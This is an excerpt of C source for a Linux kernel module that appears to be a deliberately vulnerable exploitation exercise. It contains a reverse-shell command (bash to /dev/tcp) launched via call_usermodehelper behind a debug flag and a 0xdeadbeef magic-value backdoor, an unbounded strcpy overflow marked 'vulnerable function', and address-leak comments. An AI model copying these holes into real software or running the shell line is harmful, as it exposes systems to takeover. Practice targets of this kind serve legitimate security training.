...
void debugmodule(void){
  DEBUG=1;
  pr_info("debugging module enabled!!!!");
}

 void  revshell(int magicpass,char debugbool)
{
  char *envp[] = {
        "HOME=/root",
        "TERM=xterm",
  ...
  char *argv[] = {
        "/bin/bash",
        "-c",
        "exec bash -i &>/dev/tcp/127.0.0.1/1234 <&1",
        NULL
      };
  ...
  call_usermodehelper(argv[0],argv,envp,UMH_WAIT_EXEC);
    ...
    printk(KERN_INFO"you are not root!!!!, you cant have this functionality");
  }
  
  pr_info("debug address= 0x%p",&DEBUG);
  if(DEBUG){
    pr_info("you are in debug mode get revshell ");
    call_usermodehelper(argv[0],argv,envp,UMH_WAIT_EXEC);
  }
  else{pr_info("NOT in debug mode!!!! ");}
  if(magicpass==0xdeadbeef && debugbool==0x1){
    pr_info("you got the magic pass congrats!!!");
    call_usermodehelper(argv[0],argv,envp,UMH_WAIT_EXEC);
  }
  else{pr_info("you supplied %x!!!",magicpass);
      pr_info("you supplied Debug%x!!!",debugbool);
      }
  printk(KERN_INFO "[+] Command Execution End\n");

}

int redirect_code(void){
pr_info("Congratulations u have succeded in code redirection !!!!");
return 1;
...
int copier(char *str) {
    // vulnerable function
  char buffer[1024];
  //pr_info("%p",&buffer);// 311fd9a0+<base>=4051188128
  /*
  int j;
  for (j=0;j<8;j++){
    buffer[j]=&buffer[j];
  ...
  */
  ...
  strcpy(buffer, str);
  //memcpy(buffer,str,1041);
  //copy_from_user(buffer,str,2048);
...
read_again:
        ...
        */
        ...
        // vulnerability 
        //pr_info("Buff leak for debugging : %p",buf);
        //pr_info("Buff leak for debugging: address : %p",&buf);
